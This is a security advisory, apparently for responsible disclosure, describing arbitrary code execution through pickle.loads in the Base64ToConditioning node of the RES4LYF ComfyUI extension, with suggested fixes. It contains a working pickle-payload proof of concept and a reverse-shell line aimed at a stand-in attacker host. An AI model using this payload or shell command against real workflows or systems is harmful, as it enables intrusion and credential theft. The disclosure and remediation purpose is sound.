# Security Advisory: Arbitrary Code Execution via Pickle Deserialization in RES4LYF

## Summary

The `Base64ToConditioning` node in RES4LYF accepts user-controlled string input, base64-decodes it, and passes it directly to `pickle.loads()` without any validation or sanitization. This allows arbitrary code execution when a user loads and runs a crafted ComfyUI workflow.

## Affected Component

- **Repository:** https://github.com/ClownsharkBatwing/RES4LYF
- **File:** [`conditioning.py`, lines 487-503](https://github.com/ClownsharkBatwing/RES4LYF/blob/0dc91c00c4c3fb38e7874fcd7a2a327765e8882c/conditioning.py#L487-L503)
- **Vulnerable line:** [`conditioning.py:502`](https://github.com/ClownsharkBatwing/RES4LYF/blob/0dc91c00c4c3fb38e7874fcd7a2a327765e8882c/conditioning.py#L502) — `pickle.loads()` on untrusted input
- **Node:** `Base64ToConditioning` (category: `RES4LYF/utilities`)
- **CWE:** CWE-502 (Deserialization of Untrusted Data)
- **CVSS 3.1 Estimate:** 9.8 CRITICAL (AV:N/AC:L/PR:N/UI:R/VC:H/VI:H/VA:H)

## Vulnerable Code

```python
class Base64ToConditioning:
    @classmethod
    def INPUT_TYPES(cls):
        return {
            "required": {
                "data": ("STRING", {"default": ""}),
            }
        }
    RETURN_TYPES = ("CONDITIONING",)
    FUNCTION = "main"

    def main(self, data):
        conditioning_pickle = base64.b64decode(data)
        conditioning = pickle.loads(conditioning_pickle)  # <-- Arbitrary code execution
        return (conditioning,)
```

## Attack Scenario

1. Attacker creates a ComfyUI workflow that uses the `Base64ToConditioning` node
2. The workflow's `data` input is set to a base64-encoded malicious pickle payload
3. The workflow is shared on CivitAI, Discord, Reddit, or other platforms where ComfyUI users exchange workflows
4. Victim downloads and runs the workflow
5. `pickle.loads()` executes the attacker's arbitrary Python code with full system access

### Proof of Concept

The following demonstrates the attack vector (benign payload for demonstration):

```python
import pickle
import base64

class Exploit(object):
    def __reduce__(self):
        import os
        return (os.system, ("echo 'RCE achieved' > /tmp/tensortrap_poc.txt",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(f"Malicious workflow data value: {payload}")
```

When this base64 string is placed in a workflow's `Base64ToConditioning` node `data` input and the workflow is executed, the command runs with the privileges of the ComfyUI process.

A real attacker would replace the benign command with:
- Reverse shell (`bash -i >& /dev/tcp/attacker/port 0>&1`)
- Credential theft (browser passwords, SSH keys, crypto wallets)
- Cryptominer installation
- Data exfiltration

## Impact

- **Arbitrary code execution** on any machine running the workflow
- **No user interaction beyond running the workflow** — the payload executes automatically
- **Full system access** — ComfyUI nodes run without sandboxing
- **Silent execution** — no visible indication to the user
- **Platforms affected:** Any platform where workflows are shared (CivitAI, Reddit, Discord, etc.)

## Context

This vulnerability is particularly concerning given the ComfyUI ecosystem's history of attacks:
- **Nullbulge** (June 2024): Compromised LLMVISION extension stole passwords and crypto wallets
- **Ultralytics supply chain** (Dec 2024): Cryptominer distributed via Impact-Pack dependency
- **Akira Stealer** (Jan 2026): Infostealer distributed via fake upscaler nodes
- **Pickai backdoor** (Mar 2025): 695+ servers compromised

The `Base64ToConditioning` node creates a new attack vector where the malicious payload is embedded directly in the workflow JSON, requiring no compromised packages or supply chain manipulation.

## Suggested Fix

Replace `pickle.loads()` with a safe serialization format. Options:

### Option 1: Use safetensors (Recommended)
```python
import safetensors.torch
import io
import torch

def main(self, data):
    raw = base64.b64decode(data)
    tensors = safetensors.torch.load(io.BytesIO(raw))
    # Reconstruct conditioning from tensor data
    ...
```

### Option 2: Use JSON with tensor serialization
```python
import json
import torch

def main(self, data):
    raw = base64.b64decode(data)
    obj = json.loads(raw)
    # Reconstruct conditioning from JSON structure
    ...
```

### Option 3: Use restricted unpickler
```python
import pickle
import io

class RestrictedUnpickler(pickle.Unpickler):
    ALLOWED_CLASSES = {
        ('torch', 'Tensor'),
        ('torch', 'FloatStorage'),
        ('collections', 'OrderedDict'),
    }

    def find_class(self, module, name):
        if (module, name) in self.ALLOWED_CLASSES:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Blocked: {module}.{name}")

def main(self, data):
    raw = base64.b64decode(data)
    conditioning = RestrictedUnpickler(io.BytesIO(raw)).load()
    return (conditioning,)
```

## Discovery

Discovered by TensorTrap (https://github.com/realmarauder/TensorTrap) during automated security auditing of ComfyUI custom node packages.

**Discoverer:** Sean Michael, M2 Dynamics (smichael.us@gmail.com)
**Tool:** TensorTrap v1.2.0 / ComfyUI-TensorTrap Node Auditor
**Date:** 2026-03-28

## Timeline

- 2026-03-28: Vulnerability discovered via TensorTrap automated node audit
- 2026-03-28: Advisory drafted for responsible disclosure
- TBD: Vendor notification
- TBD: Public disclosure (90 days after vendor notification, or upon fix)
